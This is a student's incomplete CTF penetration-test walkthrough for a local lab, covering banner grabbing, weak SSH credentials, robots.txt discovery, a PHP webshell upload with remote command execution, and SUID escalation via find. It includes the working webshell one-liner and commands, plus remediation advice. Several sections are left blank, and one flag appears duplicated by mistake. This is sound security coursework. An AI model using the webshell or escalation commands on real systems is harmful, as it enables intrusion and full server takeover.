# Penetration Test Walkthrough
**Student ID:** Kanishapradhan13
**Date:** 9/6/26
**Target:** localhost (CTF HackMe Corp)
**Assessment:** Ethical Hacking & Penetration Testing

---

> ⚠️ Fill in every section. Blank sections = 0 marks.
> Include real terminal output or screenshots for every command.

---

## Executive Summary
<!-- 3-4 sentences: what did you find, what was compromised, overall risk level -->

---
set up

![alt text](image.png)

![alt text](image-1.png)

## Challenge 1 — NMAP Service Banner (2 pts)

### Objective
Identify all running services and find a flag hidden in a service banner.

### Tools Used
```
curl 

```

### Commands Run
```bash

curl -I http://localhost

```

### Terminal Output / Screenshot
```
![alt text](image-2.png)

```

### Flag Found
```
FLAG{kanishapradhan13_nmap_b4nner_scan}
```

### Vulnerability Explanation
The web server revealed its software version (`Apache/2.4.57 (Debian)`) in HTTP headers, which could help attackers find known vulnerabilities. It also exposed a custom `X-Flag` header, demonstrating how sensitive information can accidentally leak through misconfigured headers. In real systems, both issues increase security risks and should be removed.

### Remediation
* Hide the server version information by changing Apache settings (`ServerTokens Prod` and `ServerSignature Off`).
* Check and remove unnecessary custom headers before putting the website online.
* Use a firewall or reverse proxy like Nginx to hide server details and improve security.

---

## Challenge 2 — SSH Weak Credentials (3 pts)

### Objective
Gain access to the server via SSH using weak default credentials.

### Tools Used
```
ssh
```

### Commands Run
```bash

ssh student@localhost
# used a basic password (password123)
```

### Terminal Output / Screenshot
```
![alt text](image-3.png)

```

### Flag Found
```
FLAG{kanishapradhan13_ssh_w3ak_cred5}

```

### Vulnerability Explanation
The SSH service was using a weak default password (password123) for the student account. This means anyone who knows the password can log in easily using SSH. In real systems, weak or default passwords can allow attackers to gain access to servers and sensitive data.

### Remediation
Disable password-based SSH logins and use SSH keys instead.

Enable key-based authentication for better security.

Remove all default or hardcoded passwords before deployment.

Use tools like Fail2Ban to block repeated login attempts and reduce brute-force attacks.
---

## Challenge 3 — Hidden Web Directory (3 pts)

### Objective
Discover a hidden directory the web server does not want crawlers to index.

### Tools Used
```
curl
```

### Commands Run
```bash
curl http://localhost/robots.txt

curl http://localhost/admin-portal/
```

### Terminal Output / Screenshot
```
![alt text](image-4.png)

```

### Flag Found
```
FLAG{kanishapradhan13_r0b0ts_h1dden_d1r}

```

### Vulnerability Explanation
robots.txt is a public file designed to instruct web crawlers which paths to avoid indexing. It is not a security control.The robots.txt file showed the location of a secret admin page (/admin-portal/). Anyone could read this file and find the hidden page. The website also contained a flag inside an HTML comment, which means sensitive information was left visible in the page source. This can help attackers discover information that should not be public.

### Remediation
Do not use robots.txt to hide important pages.

Protect sensitive pages with proper login and access controls.

Remove secret information and comments from website code before publishing.
---

## Challenge 4 — SQL Injection (4 pts)

### Objective
Exploit a vulnerable search page to dump database contents including a hidden flag.

### Tools Used
```
sqlmap
```

### Commands Run
```bash
# Option A — Manual injection payload:




# Option B — sqlmap command:



```

### Injection Payload Explanation
<!-- Explain what your SQL payload does, step by step.
     Example: ' UNION SELECT flag,null,null FROM flags --
     Explain: what does UNION do? what is null? what does -- do? -->

### Terminal Output / Screenshot
```
# Paste the sqlmap output or browser result here



```

### Flag Found
```
FLAG{...}
```

### Vulnerability Explanation
<!-- What is SQL injection? Why is string concatenation in queries dangerous? -->

### Remediation
<!-- How would you fix this? (prepared statements, parameterised queries) -->

---

## Challenge 5 — File Upload + Remote Code Execution (4 pts)

### Objective
Upload a PHP webshell to the server and execute commands to read a protected file.

### Tools Used
```
curl+PHP
```

### Webshell Used
```php
echo '<?php system($_GET["c"]); ?>' > shell.php

```

### Commands Run
```bash
# Step 1 — Create the webshell file:
echo '<?php system($_GET["c"]); ?>' > shell.php

# Step 2 — Upload via curl:
curl -F "file=@shell.php" http://localhost/upload.php

curl "http://localhost/uploads/shell.php?c=id"

curl "http://localhost/uploads/shell.php?c=cat+/var/www/html/robots.txt"

curl "http://localhost/uploads/shell.php?c=ls+-la+/var/www/html/admin-portal/"

curl "http://localhost/uploads/shell.php?c=cat+/var/www/html/admin-portal/flag.txt"

```


# Step 3 — Execute command via webshell:


```

### Terminal Output / Screenshot
```
![alt text](image-5.png)

```

### Flag Found
```
FLAG{kanishapradhan13_r0b0ts_h1dden_d1r}
```

### Vulnerability Explanation
The /upload.php page allowed users to upload any type of file without checking it. An attacker uploaded a .php file, which is a file that can run code on the server. Because the file was stored in a public folder, the server executed it when opened through a browser. This gave the attacker full control of the server and allowed them to run system commands using a hidden parameter.

### Remediation
Only allow safe file types like .jpg, .png, and .pdf

Check the real file type, not just the file name

Store uploaded files outside the public website folder

Rename uploaded files to random names

Do not allow uploaded files to run as code on the server
---

## Challenge 6 — SUID Privilege Escalation (4 pts)

### Objective
After gaining a shell on the server, escalate from a low-privilege user to root using a SUID misconfiguration.

### Tools Used
```
find +ssh
```

### Commands Run
```bash
# Step 1 — SSH into the server:

ssh student@localhost


# Step 2 — Find SUID binaries:

find / -perm -4000 -type f 2>/dev/null


# Step 3 — Exploit the SUID binary:
/usr/bin/find . -exec /bin/sh -p \; -quit


# Step 4 — Read the root flag:

cat /root/root.txt


```

### Terminal Output / Screenshot
```
![alt text](image-6.png)

```

### Flag Found
```
FLAG{kanishapradhan13_su1d_r00t_3scalat3}
```

### SUID Explanation
A program called readfile was set to run with root permissions because of a special setting called SUID. This means that even normal users could run it as if they were the root user.

The program allowed users to give a file path and read any file on the system. Because it ran as root, an attacker could read very sensitive files like /root/flag.txt and /etc/shadow. This is very dangerous because it breaks system security and allows privilege escalation.

### Remediation
Check and remove unnecessary SUID programs
Disable SUID on readfile using chmod u-s
Avoid creating custom SUID programs
Use sudo with strict rules instead of SUID
Apply the “least privilege” rule so users only access what they need
Use security tools like AppArmor or SELinux to restrict program actions
---

## Final Score Summary

| Challenge | Flag Submitted | Marks |
|-----------|---------------|-------|
| 1 — NMAP Banner | FLAG{...} | /2 |
| 2 — SSH Weak Creds | FLAG{...} | /3 |
| 3 — Hidden Directory | FLAG{...} | /3 |
| 4 — SQL Injection | FLAG{...} | /4 |
| 5 — File Upload RCE | FLAG{...} | /4 |
| 6 — SUID Privesc | FLAG{...} | /4 |
| **CTF Total** | | **/20** |
| Walkthrough Quality | | /5 |
| Viva | | /10 |
| **Grand Total** | | **/35** |

---

## Lessons Learned
<!-- What 3 things did you learn from this CTF? -->
1.
2.
3.

---

## References
<!-- List any tools, websites, or resources you used -->
-
-
-
